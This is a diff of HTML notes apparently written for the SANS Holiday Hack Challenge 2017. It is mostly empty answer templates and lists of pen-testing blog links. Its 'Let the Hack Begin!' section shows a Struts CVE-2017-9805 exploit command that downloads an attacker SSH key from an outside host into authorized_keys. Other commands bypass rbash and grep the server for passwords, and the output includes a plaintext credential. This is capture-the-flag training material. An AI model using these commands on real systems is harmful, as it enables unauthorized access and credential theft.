+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orgdfe0fd6"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-7-1-3" name="sec-6-7-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org849ef72"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-7-1-4" name="sec-6-7-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -3256,62 +3290,60 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orgb0ace11"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-7-1-5" name="sec-6-7-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="orgc647e9a"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-7-1-6" name="sec-6-7-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org5a8cf82"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-7-1-7" name="sec-6-7-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org8a946d4"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-7-1-8" name="sec-6-7-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org877a271" class="outline-3">
-<h3 id="org877a271">Question 8</h3>
-<div class="outline-text-3" id="text-org877a271">
-</div>
-<div id="outline-container-org4e432cc" class="outline-4">
-<h4 id="answer-template"><a id="org4e432cc"></a>Answer Template</h4>
+<div id="outline-container-sec-6-8" class="outline-3">
+<h3 id="sec-6-8">Question 8</h3>
+<div class="outline-text-3" id="text-6-8">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-8-1" name="sec-6-8-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org31b1f89"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-8-1-1" name="sec-6-8-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Fetch the letter to Santa from the North Pole Elf Database at
-<a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>. Who wrote the letter?</li>
+<a href="http://edb.northpolechristmastown.com">http://edb.northpolechristmastown.com</a>. Who wrote the letter?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org9241d1a"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-8-1-2" name="sec-6-8-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -3337,42 +3369,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org70fadcc"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-8-1-3" name="sec-6-8-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org81b55dc"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-8-1-4" name="sec-6-8-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -3380,62 +3420,60 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org4e90912"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-8-1-5" name="sec-6-8-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org60bfb73"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-8-1-6" name="sec-6-8-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="orge2695f2"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-8-1-7" name="sec-6-8-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org42f85c2"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-8-1-8" name="sec-6-8-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org3f0fba9" class="outline-3">
-<h3 id="org3f0fba9">Question 9</h3>
-<div class="outline-text-3" id="text-org3f0fba9">
-</div>
-<div id="outline-container-org3e8536d" class="outline-4">
-<h4 id="answer-template"><a id="org3e8536d"></a>Answer Template</h4>
+<div id="outline-container-sec-6-9" class="outline-3">
+<h3 id="sec-6-9">Question 9</h3>
+<div class="outline-text-3" id="text-6-9">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-9-1" name="sec-6-9-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org32e66ed"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-9-1-1" name="sec-6-9-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Which character is ultimately the villain causing the giant snowball
-problem. What is the villain's motive?</li>
+problem. What is the villain's motive?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org915fda4"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-9-1-2" name="sec-6-9-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -3461,42 +3499,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org827866e"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-9-1-3" name="sec-6-9-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org8430dcd"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-9-1-4" name="sec-6-9-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -3504,56 +3550,57 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org6c3e74b"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-9-1-5" name="sec-6-9-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org0bfc00b"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-9-1-6" name="sec-6-9-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org2c7943b"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-9-1-7" name="sec-6-9-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org8caa9a2"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-9-1-8" name="sec-6-9-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
 </div>
-<div id="outline-container-org2a30f35" class="outline-2">
-<h2 id="org2a30f35">Misc/TODO</h2>
-<div class="outline-text-2" id="text-org2a30f35">
+<div id="outline-container-sec-7" class="outline-2">
+<h2 id="sec-7">Easter Eggs</h2>
+</div>
+<div id="outline-container-sec-8" class="outline-2">
+<h2 id="sec-8">Misc/TODO</h2>
+<div class="outline-text-2" id="text-8">
 <p>
 Need to add this content elsewhere
 </p>
 </div>
-<div id="outline-container-org735e341" class="outline-3">
-<h3 id="org735e341">Let the Hack Begin!</h3>
-<div class="outline-text-3" id="text-org735e341">
-</div>
-<div id="outline-container-org2ff1529" class="outline-4">
-<h4 id="org2ff1529">Gaining Access to L2S</h4>
-<div class="outline-text-4" id="text-org2ff1529">
+<div id="outline-container-sec-8-1" class="outline-3">
+<h3 id="sec-8-1">Let the Hack Begin!</h3>
+<div class="outline-text-3" id="text-8-1">
+</div><div id="outline-container-sec-8-1-1" class="outline-4">
+<h4 id="sec-8-1-1">Gaining Access to L2S</h4>
+<div class="outline-text-4" id="text-8-1-1">
 <p>
 The SAN cert showed it the was the same as dev.northpolechristmastown.com.
 </p>
@@ -3567,19 +3614,19 @@ Used the Python tool in the SANS blog post:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="color: #8abeb7;">'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'</span>
+
+<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'</span>
 </pre>
 </div>
 </div>
 
-<ul class="org-ul">
-<li><a id="org077748d"></a>Finding the password for alabaster_snowball<br />
-<div class="outline-text-5" id="text-org077748d">
+<ul class="org-ul"><li><a id="sec-8-1-1-1" name="sec-8-1-1-1"></a>Finding the password for alabaster_snowball<br  /><div class="outline-text-5" id="text-8-1-1-1">
 <p>
 Login using ssh, but explicitly run bash, bypassing the rbash restriction
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
 </pre>
 </div>
@@ -3589,11 +3636,12 @@ First, fix the shells path.  We can grab what a normal path looks like from /etc
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">alabaster_snowball@l2s:~$ grep PATH /etc/profile
-  <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
-  <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
-<span style="color: #b294bb;">export</span> PATH
-alabaster_snowball@l2s:~$ <span style="color: #f0c674;">PATH</span>=<span style="color: #8abeb7;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
+  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
+  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
+<span style="font-weight: bold;">export</span> PATH
+alabaster_snowball@l2s:~$ <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
 </pre>
 </div>
 
@@ -3603,10 +3651,11 @@ Start small and double the filesize each time to keep the process fast.
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2&gt;/dev/null |xargs grep passwor
 alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2&gt;/dev/null |xargs grep passwor
 alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2&gt;/dev/null |xargs grep passwor
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
 </pre>
 </div>
 
@@ -3615,37 +3664,38 @@ We could have also searched for the username to find intersting files:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh">$ time grep alabaster_snowball -r /opt/
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
 
-real    0m0.355s
-user    0m0.300s
-sys     0m0.052s
+<pre class="src src-sh">$ time grep alabaster_snowball -r /opt/
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
+
+real       0m0.355s
+user       0m0.300s
+sys        0m0.052s
 </pre>
 </div>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
 
-<div id="outline-container-org1d65fe1" class="outline-3">
-<h3 id="org1d65fe1">Using ripgrep</h3>
-<div class="outline-text-3" id="text-org1d65fe1">
+<div id="outline-container-sec-8-2" class="outline-3">
+<h3 id="sec-8-2">Using ripgrep</h3>
+<div class="outline-text-3" id="text-8-2">
 <p>
 Ripgrep is a super fast grep replacement written in rust.
 It does a better job at filtering binary files, so we can run this command that finishes in about a second:
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">$ mkdir /tmp/.rg
 $ cd /tmp/.rg
 $ wget https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
 $ tar xvzf ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
 $ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | xargs ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
 /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
-3:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
-4-            final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
+3:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
+4-            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
 </pre>
 </div>
 
@@ -3656,22 +3706,23 @@ a few lines are output.
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">$ time ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster / --no-messages |grep -v /proc|grep -v deb.debian.org
 /etc/crontab:#@reboot root /usr/bin/nohup /usr/bin/sudo -u alabaster_snowball /opt/apache-tomcat/start_tomcat.sh &amp;
 /etc/subuid:alabaster_snowball:296608:65536
 /etc/passwd:alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
 /etc/group:alabaster_snowball:x:1004:
 /etc/subgid:alabaster_snowball:296608:65536
-/etc/systemd/system/tomcat.service:<span style="color: #f0c674;">User</span>=alabaster_snowball
-/etc/systemd/system/tomcat.service:<span style="color: #f0c674;">Group</span>=alabaster_snowball
+/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">User</span>=alabaster_snowball
+/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">Group</span>=alabaster_snowball
 /usr/share/dh-python/dist/cpython3_fallback:alabaster python3-alabaster
 /usr/share/dh-python/dist/cpython2_fallback:alabaster python-alabaster
-/usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = <span style="color: #8abeb7;">'alabaster'</span>
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
+/usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = <span style="font-style: italic;">'alabaster'</span>
+/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
 
-real    0m4.095s
-user    0m1.864s
-sys     0m18.808s
+real       0m4.095s
+user       0m1.864s
+sys        0m18.808s
 </pre>
 </div>
 
@@ -3698,6 +3749,7 @@ Even without scanning any ports, we can guess what hhc17-smb-server does!
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">ssh l2s | tee nmap.out
 </pre>
 </div>
@@ -3917,6 +3969,7 @@ Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
 </div>
 <div id="postamble" class="status">
 <p class="author">Author: Vlad Grigorescu</p>
+<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.3.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
 <p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
 </body>
